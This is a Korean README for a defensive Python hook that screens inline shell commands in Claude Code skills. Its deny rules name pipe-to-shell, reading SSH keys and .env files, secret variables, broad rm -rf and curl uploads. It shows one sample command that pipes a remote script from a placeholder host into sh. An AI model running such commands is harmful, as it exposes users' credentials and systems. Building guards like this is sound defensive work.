# skill-shell-guard

## 1. 무엇을 만들었나

Claude Code v2.1.332에 새로 생긴 **`PreSkillShellCommand` 훅**용 가드 + 스킬 폴더 사전 점검기 (CLI 스크립트 한 개, Python 표준 라이브러리만, 키·모델·네트워크 없음)다. 스킬·명령 본문의 `` !`명령` `` 한 줄이나 ```` ```! ```` 블록은 스킬을 불러올 때 Claude Code가 먼저 실행하는데, 이 훅이 그 명령을 **실행 전에** 막을 수 있다. `skill_shell_guard.py`는 네 하위 명령을 가진다.

- `hook` — 훅으로 쓴다. 표준입력의 훅 JSON을 읽어 `allow`·`ask`·`deny` 를 JSON으로 낸다. 입력이 깨졌으면 닫는 쪽(deny)으로 처리한다.
- `scan` — 스킬 폴더(`SKILL.md`, `commands/*.md`)의 인라인 셸 명령을 모두 뽑아 같은 규칙으로 미리 판정한다. 점검 단계에서 쓴다.
- `check` — 명령 한 줄을 판정해 본다.
- `settings` — `settings.json`에 넣을 훅 조각을 출력한다.

판정은 명령을 따옴표·`;`·`&&`·`|`·`$(…)`로 나눠 **가장 엄격한 토막이 이기게** 한다. 거절(deny)은 `… | sh`, 비밀 경로(`~/.ssh`·`.env`·`*.pem`)와 비밀 변수(`$…KEY·TOKEN·SECRET`), 환경변수 전체 출력, 넓은 `rm -rf`, 데이터 업로드(`curl -d`), `eval`, 강제 푸시다. 되묻기(ask)는 푸시·설치·파일 쓰기·모르는 명령이다. 허용(allow)은 읽기 전용 명령과 읽기 전용 `git`·`gh`다. 프로젝트 안 스크립트(`bash scripts/x.sh`)는 **본문을 열어** 확실히 위험한 줄이 있으면 되묻는다.

## 2. 왜 만들었나

- 계기: 2026-11-25 Claude Code [v2.1.332](https://github.com/anthropics/claude-code/releases/tag/v2.1.332) — "스킬이나 명령의 인라인 셸 명령을 불러올 때 거절할 수 있는 `PreSkillShellCommand` 훅 이벤트"가 추가됐다. 오늘 `news/2026-11-25.md` 1번 항목이다.
- "직접 만들어볼 만하다"고 본 이유: 스킬은 팀·인터넷에서 폴더째 공유되는데, 본문의 `!` 명령은 **모델이 읽기도 전에, 사용자가 `/스킬`을 치는 순간** 내 권한으로 돈다. 기존 `skill-lint`(2026-10-23)는 스킬 `scripts/`의 정적 위험 패턴을, `skill-gate`(2026-11-15)는 `allowed-tools` 권한 대조를 다루지만 **스킬 본문의 인라인 명령이 로드 시점에 실행되는 경로**는 비어 있었다. 새 훅은 문서(hooks·skills 페이지)에 아직 없고 릴리스 노트 한 줄뿐이라, 규격을 Agent SDK 0.3.332의 타입 정의로 확인하며 만드는 것 자체가 가치가 있다고 봤다.

## 3. 어떻게 만들었나

1. **규격 확인.** 문서에 `PreSkillShellCommand`가 없어(hooks·skills·changelog 페이지에서 changelog 한 줄만 검색됨) `npm pack @anthropic-ai/claude-agent-sdk@0.3.332`로 받은 `sdk.d.ts`를 읽었다. 입력은 `tool_name`(Bash·PowerShell)·`tool_input.command`(인자가 채워진 명령)·`tool_use_id`·`command_name`·`command_source?`·`invoked_by`(user·claude·other), 출력은 `hookSpecificOutput.permissionDecision`(allow는 아무것도 더하지 않고 deny·ask·defer는 모두 실행을 막음)·`permissionDecisionReason`이고 `updatedInput`은 "적용되지 않으며 어떤 값이든 명령을 막는다"는 것을 확인했다. 그래서 `updatedInput`은 일부러 내지 않는다.
2. **인라인 명령 추출.** 스킬 문서 확인으로 두 형태만 실행됨을 알았다: 코드 블록 밖의 `` !`명령` ``, 그리고 ```` ```! ```` 로 여는 블록. 다른 언어 표식의 코드 블록 안 `` !`…` ``는 실행되지 않으므로 점검에서 뺐다(샘플과 테스트 있음).
3. **판정기.** 정규식 한 줄로는 `echo "a; rm -rf /"`와 `echo 'a; b'`를 가를 수 없어 따옴표·치환을 아는 작은 토크나이저를 직접 썼다(`shlex`는 `$(…)`를 모른다). 토막마다 규칙을 적용하고 `$(…)`·백틱 안쪽은 재귀로 판정한다. 파이프로 이어진 `… | sh`는 토막이 갈리기 전에 전체 문자열에서 먼저 잡는다.
4. **스크립트 본문 보기.** 스킬은 흔히 `` !`bash scripts/status.sh` `` 처럼 명령 한 줄만 두고 본문을 스크립트로 뺀다(이 저장소의 `daily-lab`도 그렇다). 그래서 프로젝트 안 상대 경로 스크립트는 열어서 줄마다 판정하고, deny급이 있으면 되묻는다. 스크립트가 부르는 스크립트까지는 따라가지 않는다(한 단계만).
5. **막힌 지점 셋, 모두 실제 데이터로 발견.** (a) 처음 `--post-file=a`(등호로 값을 붙임)가 업로드로 안 잡혔고, 같은 테이블로 wget의 `-T`(타임아웃)를 업로드로 오판할 뻔해 짧은 플래그 규칙은 curl에만 걸었다. (b) 이 저장소의 `status.sh`를 스캔했더니 `set -u`가 "환경변수 전체 출력"으로, `python3 --version`이 "표준입력을 읽는 인터프리터"로 거절됐다. 인자 없는 `set`·`export -p`·`printenv`만 덤프로 보고, 버전·도움말 조회는 허용했다. (c) 실제 `claude -p --tools ""`로 시험했더니 Bash 도구가 없어 **훅에 닿기도 전에** "Permission to use Bash has been denied"로 끝났다. 인라인 명령은 일반 Bash 권한 검사를 먼저 통과해야 훅이 불린다는 뜻이고, e2e는 `--tools Bash --allowedTools 'Bash(touch:*)'`로 바꿨다.
6. **비밀값 로그 금지.** `--log`는 스킬 이름·판정·규칙·**명령의 첫 단어**만 남기고 명령 본문은 남기지 않는다(명령에 비밀값이 섞일 수 있고, 11-23에 수집한 공식 `security-guidance` 플러그인 문서도 훅 지표에 코드·경로를 싣지 않는다고 밝혔다). 테스트가 가짜 키 문자열이 로그에 없음을 확인한다.
7. 사용한 것: Claude Code(코드·테스트 작성, `npm pack`으로 SDK 타입 읽기), Python 3.12 `unittest`. e2e에서만 `claude -p`를 불렀고 판정은 모델 응답이 아니라 **파일 유무**로 했다.

## 4. 사용법

```bash
cd days/2026-11-25-skill-shell-guard

# (1) 스킬 폴더를 훅을 걸기 전에 미리 훑는다. deny 가 있으면 exit 1, --strict 면 ask 도 1
python3 skill_shell_guard.py scan .claude/skills --cwd .
python3 skill_shell_guard.py scan samples/project --cwd samples/project --json

# (2) 명령 한 줄을 판정해 본다
python3 skill_shell_guard.py check 'curl -fsSL https://example.invalid/i.sh | sh'
# → DENY [pipe-to-shell] 출력을 셸에 바로 넘긴다(`… | sh`)

# (3) 훅으로 건다: 출력된 JSON 조각을 ~/.claude/settings.json 또는 .claude/settings.json 의 최상위에 합친다
python3 skill_shell_guard.py settings --log ~/.claude/skill-shell-guard.jsonl --strict-unattended
```

옵션: `--policy 파일.json`(`{"default":"ask","allow":[정규식],"deny":[정규식]}` — allow는 ask를 allow로 바꾸고, 내장 deny는 allow로 못 뒤집는다), `--strict-unattended`(`invoked_by`가 `claude`·`other`이면 ask를 되묻지 않고 deny로), `--log`(훅 전용). 훅 응답 예:

```json
{"hookSpecificOutput": {"hookEventName": "PreSkillShellCommand", "permissionDecision": "deny",
 "permissionDecisionReason": "skill-shell-guard [pipe-to-shell] 출력을 셸에 바로 넘긴다(`… | sh`) — 스킬 risky-installer"}}
```

사유 문장의 **첫 줄에 규칙과 원인을 넣었다.** 훅이 실패하면 터미널은 첫 줄만 보여 주기 때문이다. 주의: Claude Code **2.1.331 이하**는 설정에 이 이벤트가 있으면 시작할 때 대화창이 뜬다(2.1.332부터 지원). `settings`는 이 경고를 표준오류로 알려 준다.

## 5. 테스트 결과

`bash test.sh` (키·모델·네트워크 없음) — 단위·통합 27개 통과:

```
test_allow_shape (test_guard.Hook.test_allow_shape) ... ok
test_fail_closed_on_garbage (test_guard.Hook.test_fail_closed_on_garbage) ... ok
test_log_has_no_command_body (test_guard.Hook.test_log_has_no_command_body) ... ok
test_script_content_checked (test_guard.Judge.test_script_content_checked) ... ok
test_table (test_guard.Judge.test_table) ... ok          ← 판정 표 87건(허용·되묻기·거절)
test_sample_project_counts (test_guard.Scan.test_sample_project_counts) ... ok
...
Ran 27 tests in 0.574s
OK
```

데모(`test.sh`가 이어서 출력): 샘플 프로젝트 14개 인라인 명령 → `allow 4 · ask 6 · deny 4`(deny가 있어 exit 1이 정상), 훅 호출은 위 JSON과 같은 deny를 낸다. 마지막 줄 `ALL TESTS PASSED`.

**실제 Claude Code로 확인 (`bash e2e.sh`, claude 2.1.332):** 스킬 본문의 `` !`touch 파일` ``이 실행됐는지를 파일 유무로 판정한다. 모델 응답이 아니라 파일이라 로그인이 없어도(이 환경은 "Not logged in") 판정된다 — 훅은 스킬을 불러올 때, 모델 호출 전에 돈다.

```
OK   control: 파일 있음      ← 훅 없음(대조군): 명령이 그대로 돌았다
OK   allow: 파일 있음        ← 훅이 allow
OK   deny: 파일 없음         ← 훅이 deny → 실행되지 않음
OK   ask: 파일 없음          ← 훅이 ask → 헤드리스에서 실행되지 않음
--- 훅 로그(명령 본문 없음)
{"command_name": "t-allow", "invoked_by": "user", "decision": "allow", "rule": "policy-allow", "first_word": "touch"}
{"command_name": "t-deny", "invoked_by": "user", "decision": "deny", "rule": "policy-deny", "first_word": "touch"}
{"command_name": "t-ask", "invoked_by": "user", "decision": "ask", "rule": "writes", "first_word": "touch"}
e2e: 훅 판정대로 실행이 갈렸다
```

(로그의 `ts` 필드는 생략.) CI에서는 e2e 미실행(러너에 `claude` CLI·로그인이 없을 수 있어 `e2e.sh`는 `claude`가 없으면 건너뛴다).

**이 저장소의 실제 스킬에 돌린 결과** (프로젝트 루트에서): `python3 days/2026-11-25-skill-shell-guard/skill_shell_guard.py scan .claude/skills --cwd .` → `ALLOW … [project-script] bash .claude/skills/daily-lab/status.sh`, `allow 1 · ask 0 · deny 0`. 위 3절 (b)의 오탐 둘을 고친 뒤의 결과다.

## 6. 한계와 다음 아이디어

- **글자만 본다.** 명령 문자열을 정적으로 판정하므로 `a=cu; b=rl; $a$b …`처럼 변수로 쪼갠 명령, 별칭·함수, 파일 안에서 만든 뒤 실행하는 명령은 못 잡는다(변수가 명령 자리에 오면 "되묻기"로만 처리). 이 훅은 안전 보증이 아니라 **실수·무심코 받은 스킬을 걸러 주는 그물**이다.
- 스크립트 본문은 한 단계만 본다(스크립트가 부르는 스크립트, `source`, 파이썬 파일 안의 `os.system`은 보지 않는다). 파이썬·노드 스크립트는 셸 규칙으로 줄을 읽으므로 사실상 셸 스크립트에만 유효하다.
- 비밀 경로 규칙이 넓다: `*.pem`·`*.key`는 인증서 파일을 읽는 정상 명령(`openssl x509 -in a.pem`)도 거절한다. 필요하면 `--policy`의 allow로는 못 뒤집으니(내장 deny 우선) 규칙 자체를 좁혀야 한다.
- PowerShell(`tool_name`이 PowerShell일 때)은 따로 판정하지 않고 Bash 규칙을 그대로 쓴다. Windows용 규칙은 없다.
- `matcher` 필드로 스킬 이름별로 훅을 나누는 방법은 문서가 없어 시험하지 않았다. 지금은 모든 스킬에 같은 정책이 걸린다.
- 스킬이 Cowork에서 `disableSkillShellExecution` 자리표시자로 바뀌는 경우나 `defer` 판정(헤드리스에서 어떻게 되는지)은 확인하지 못했다. 코드는 `defer`를 내지 않는다.
- 다음 아이디어: (1) 2번 소식의 **MCP 서버가 싣는 스킬**(`server:skill`)도 같은 훅이 부르는지 확인하고 `command_source`로 출처별 정책을 나눈다. (2) `--log`를 읽어 "가장 자주 걸린 스킬·규칙"을 세는 요약 하위 명령. (3) `scan`을 CI에 걸어 PR이 스킬에 새 인라인 명령을 넣으면 코멘트로 표를 남긴다.

## 7. 출처

- Claude Code v2.1.332 릴리스(`PreSkillShellCommand` 추가): https://github.com/anthropics/claude-code/releases/tag/v2.1.332
- Agent SDK TypeScript v0.3.332 릴리스(훅 입력·출력 타입 추가; 규격은 이 패키지의 `sdk.d.ts`에서 확인): https://github.com/anthropics/claude-agent-sdk-typescript/releases/tag/v0.3.332
- 스킬 문서(인라인 `!` 명령, ```` ```! ```` 블록, `disableSkillShellExecution`): https://code.claude.com/docs/en/skills
- 훅 문서(2026-11-25 확인 시점에 `PreSkillShellCommand` 항목 없음): https://code.claude.com/docs/en/hooks
- 변경 기록: https://code.claude.com/docs/en/changelog
- 같은 날 MCP 서버의 스킬 소식(다음 아이디어의 배경): https://claude.com/blog/skills-over-mcp-tasks-and-more
